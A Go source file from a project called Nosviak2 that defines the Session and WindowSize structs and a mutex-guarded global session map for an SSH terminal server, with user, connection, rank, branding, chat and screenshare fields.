package sessions

import (
	"Nosviak2/core/database"
	"Nosviak2/core/sources/ranks"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	//stores all the sessions inside the array
	//this will make sure its done correctly without issues
	Sessions map[int64]*Session = make(map[int64]*Session)
	Mutex sync.Mutex
)

type Session struct {
	//stores the user data properly
	//this will allow for better handling without issues
	User *database.User //stores the database structure
	//stores the conn data properly
	//this will store the ssh.ServerConn information properly
	Conn *ssh.ServerConn //stores the ongoing connection
	//stores the channel data properly
	//this will store the ssh.Channel information properly
	Channel ssh.Channel //stores the channel for the connection
	//stores the session id properly
	//this will make sure its done correctly without issues
	ID int64
	//stores everything which has been written to the remote host
	//this allows for better handling without issues happening on reqeust
	Written []string //stored in array of strings properly
	//stores the connected time and idle
	//this will be used inside certain areas
	Connected, Idle time.Time
	//stores the window size properly
	//this will ensure its done without any issues
	*WindowSize //stores the current window size
	//stores the current theme selected
	//this will allow for proper theme changing
	BrandingPath []string //stores the branding path for essential branding
	//stores the colours for gradients
	//this will be used for the pager/tables mainly
	Colours [][]int
	//stores the users ip properly
	//this will be used like this to stop any issues with ip rewrite
	Target string //stores the network address properly without issues
	//stores the users tracer information
	//this will allow for proper handling inside prommote functions
	TracerMatrix []int //stored inside the int array
	//stores all the users rank
	//this will allow for easy management
	*ranks.Ranks //stores the ranks structure
	//stores if the session is inside the chat
	//this will ensure its done without any errors
	Chat bool //checks if the user is inside a chat
	//stores the temp title properly
	//this will ensure its done without issues
	Title string //stores the title string properly
	CustomTitleReset int64 //sets the custom title reset unix 
	Viewers int //how many people are watching the screenshare currently
}

//shows the window size properly
//this will be used in certain areas properly
type WindowSize struct { //stored in type structure
	Height int //stores the window height
	Length int //stores the window length
}